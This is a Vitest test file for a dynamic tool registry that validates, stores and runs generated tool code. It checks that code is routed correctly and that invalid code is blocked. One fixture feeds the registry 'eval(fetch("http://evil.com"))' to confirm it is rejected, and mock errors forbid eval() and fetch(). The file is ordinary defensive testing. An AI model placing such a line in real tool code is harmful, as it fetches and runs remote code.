// @vitest-environment happy-dom
import { describe, it, expect, beforeEach, vi } from 'vitest';

const mockGetDynamicTools = vi.fn();
const mockSaveDynamicTool = vi.fn();
const mockAddLog = vi.fn();
const mockSetMode = vi.fn();
const mockAddSwarmProposal = vi.fn();
const mockValidateAndSanitize = vi.fn();
const mockLoggerError = vi.fn();
const mockLoggerWarn = vi.fn();
const mockLoggerDebug = vi.fn();
const mockGetGeminiManifests = vi.fn();
const mockExecuteCapability = vi.fn();
const mockGetCapability = vi.fn();
const mockRegisterDynamicCapability = vi.fn();
const mockIsInitialized = vi.fn();

vi.mock('../persistenceService', () => ({
  neuralVault: {
    getDynamicTools: (...args: any[]) => mockGetDynamicTools(...args),
    saveDynamicTool: (...args: any[]) => mockSaveDynamicTool(...args),
  },
}));

vi.mock('../../store', () => ({
  useAppStore: {
    getState: () => ({
      mode: 'command',
      user: { name: 'Test' },
      kernel: {},
      actions: {
        addLog: mockAddLog,
        setMode: mockSetMode,
        addSwarmProposal: mockAddSwarmProposal,
      },
    }),
  },
}));

vi.mock('../../utils/validateToolCode', () => ({
  validateAndSanitize: (...args: any[]) => mockValidateAndSanitize(...args),
}));

vi.mock('../logger', () => ({
  logger: {
    error: (...args: any[]) => mockLoggerError(...args),
    warn: (...args: any[]) => mockLoggerWarn(...args),
    debug: (...args: any[]) => mockLoggerDebug(...args),
  },
}));

vi.mock('../capabilities', () => ({
  registerDynamicCapability: (...args: any[]) => mockRegisterDynamicCapability(...args),
  executeCapability: (...args: any[]) => mockExecuteCapability(...args),
  getCapability: (...args: any[]) => mockGetCapability(...args),
  getGeminiManifests: (...args: any[]) => mockGetGeminiManifests(...args),
  isInitialized: (...args: any[]) => mockIsInitialized(...args),
}));

vi.mock('./toolRegistry', () => ({}));

vi.mock('../toolRegistry', () => ({
  OS_TOOLS: {
    legacy_tool: vi.fn().mockReturnValue({ status: 'legacy' }),
  },
}));

vi.mock('@google/genai', () => ({
  FunctionDeclaration: {},
  Type: {},
}));

import { DynamicToolRegistry } from '../DynamicToolRegistry';

describe('DynamicToolRegistry', () => {
  let registry: DynamicToolRegistry;

  beforeEach(() => {
    vi.clearAllMocks();
    registry = new DynamicToolRegistry();
    mockGetDynamicTools.mockResolvedValue([]);
    mockGetGeminiManifests.mockReturnValue([]);
    mockGetCapability.mockReturnValue(null);
  });

  describe('initialize', () => {
    it('should hydrate dynamic tools from vault', async () => {
      mockGetDynamicTools.mockResolvedValue([
        { id: 'tool_a', manifest: { name: 'tool_a' }, code: 'return 1;' },
        { id: 'tool_b', manifest: { name: 'tool_b' }, code: 'return 2;' },
      ]);

      await registry.initialize();

      expect(mockGetDynamicTools).toHaveBeenCalled();
      expect(mockLoggerDebug).toHaveBeenCalledWith(
        expect.stringContaining('2 evolved protocols')
      );
    });

    it('should handle empty vault gracefully', async () => {
      mockGetDynamicTools.mockResolvedValue([]);

      await registry.initialize();

      expect(mockLoggerDebug).toHaveBeenCalledWith(
        expect.stringContaining('0 evolved protocols')
      );
    });
  });

  describe('getCombinedManifests', () => {
    it('should merge unified registry manifests with dynamic manifests', async () => {
      const unifiedManifests = [{ name: 'static_tool' }];
      mockGetGeminiManifests.mockReturnValue(unifiedManifests);

      mockGetDynamicTools.mockResolvedValue([
        { id: 'dyn_tool', manifest: { name: 'dyn_tool' }, code: 'return 1;' },
      ]);
      await registry.initialize();

      const combined = registry.getCombinedManifests();

      expect(combined).toHaveLength(2);
      expect(combined[0]).toEqual({ name: 'static_tool' });
      expect(combined[1]).toEqual({ name: 'dyn_tool' });
    });

    it('should return only unified manifests when no dynamic tools exist', () => {
      mockGetGeminiManifests.mockReturnValue([{ name: 'only_static' }]);

      const combined = registry.getCombinedManifests();

      expect(combined).toHaveLength(1);
      expect(combined[0]).toEqual({ name: 'only_static' });
    });
  });

  describe('execute', () => {
    it('should execute a dynamic tool when it exists', async () => {
      mockGetDynamicTools.mockResolvedValue([
        { id: 'my_tool', manifest: { name: 'my_tool' }, code: 'return args.x + 1;' },
      ]);
      mockValidateAndSanitize.mockReturnValue({
        valid: true,
        sanitizedCode: 'return args.x + 1;',
        errors: [],
      });
      await registry.initialize();

      const result = await registry.execute('my_tool', { x: 5 });

      expect(result).toHaveProperty('toolName', 'my_tool');
      expect(result).toHaveProperty('status');
    });

    it('should block execution when validation fails', async () => {
      mockGetDynamicTools.mockResolvedValue([
        { id: 'bad_tool', manifest: { name: 'bad_tool' }, code: 'eval("bad")' },
      ]);
      mockValidateAndSanitize.mockReturnValue({
        valid: false,
        sanitizedCode: '',
        errors: ['eval() is forbidden'],
      });
      await registry.initialize();

      const result = await registry.execute('bad_tool', {});

      expect(result.status).toBe('ERROR');
      expect(result.data.error).toContain('SECURITY_VIOLATION');
      expect(mockLoggerError).toHaveBeenCalled();
    });

    it('should route to capabilities registry when not a dynamic tool', async () => {
      mockGetCapability.mockReturnValue({ name: 'cap_tool' });
      mockExecuteCapability.mockResolvedValue({ success: true, result: 'done' });

      const result = await registry.execute('cap_tool', { arg: 1 });

      expect(result).toEqual({
        toolName: 'cap_tool',
        status: 'SUCCESS',
        data: 'done',
        uiHint: 'MESSAGE',
      });
    });

    it('should return ERROR status when capability execution fails', async () => {
      mockGetCapability.mockReturnValue({ name: 'fail_cap' });
      mockExecuteCapability.mockResolvedValue({ success: false, result: 'error msg' });

      const result = await registry.execute('fail_cap', {});

      expect(result.status).toBe('ERROR');
      expect(result.data).toBe('error msg');
    });

    it('should fall back to legacy OS_TOOLS', async () => {
      mockGetCapability.mockReturnValue(null);

      const result = await registry.execute('legacy_tool', {});

      expect(result).toEqual({ status: 'legacy' });
      expect(mockLoggerWarn).toHaveBeenCalledWith(
        expect.stringContaining('DEPRECATED'),
        undefined,
        'DynamicToolRegistry'
      );
    });

    it('should throw when tool is not found anywhere', async () => {
      mockGetCapability.mockReturnValue(null);

      await expect(registry.execute('nonexistent', {})).rejects.toThrow(
        'Protocol [nonexistent] unreachable'
      );
    });
  });

  describe('registerDynamicTool', () => {
    it('should save valid tool and re-initialize', async () => {
      mockValidateAndSanitize.mockReturnValue({
        valid: true,
        sanitizedCode: 'return 42;',
        errors: [],
      });
      mockSaveDynamicTool.mockResolvedValue(undefined);

      const result = await registry.registerDynamicTool(
        'new_tool',
        { name: 'new_tool' },
        'return 42;'
      );

      expect(result).toEqual({ success: true });
      expect(mockSaveDynamicTool).toHaveBeenCalledWith(
        'new_tool',
        { name: 'new_tool' },
        'return 42;'
      );
      expect(mockAddLog).toHaveBeenCalledWith(
        'SUCCESS',
        expect.stringContaining('new_tool')
      );
    });

    it('should reject invalid tool code without saving', async () => {
      mockValidateAndSanitize.mockReturnValue({
        valid: false,
        sanitizedCode: '',
        errors: ['eval() is forbidden', 'fetch() is forbidden'],
      });

      const result = await registry.registerDynamicTool(
        'bad_tool',
        { name: 'bad_tool' },
        'eval(fetch("http://evil.com"))'
      );

      expect(result).toEqual({
        success: false,
        errors: ['eval() is forbidden', 'fetch() is forbidden'],
      });
      expect(mockSaveDynamicTool).not.toHaveBeenCalled();
      expect(mockLoggerError).toHaveBeenCalled();
      expect(mockAddLog).toHaveBeenCalledWith(
        'ERROR',
        expect.stringContaining('TOOL_FORGE_BLOCKED')
      );
    });
  });

  describe('dynamic tool execution error handling', () => {
    it('should catch runtime errors and return ERROR status', async () => {
      mockGetDynamicTools.mockResolvedValue([
        { id: 'crash_tool', manifest: { name: 'crash_tool' }, code: 'throw new Error("boom")' },
      ]);
      mockValidateAndSanitize.mockReturnValue({
        valid: true,
        sanitizedCode: 'throw new Error("boom")',
        errors: [],
      });
      await registry.initialize();

      const result = await registry.execute('crash_tool', {});

      expect(result.status).toBe('ERROR');
      expect(result.data).toHaveProperty('error');
      expect(mockLoggerError).toHaveBeenCalled();
    });
  });
});
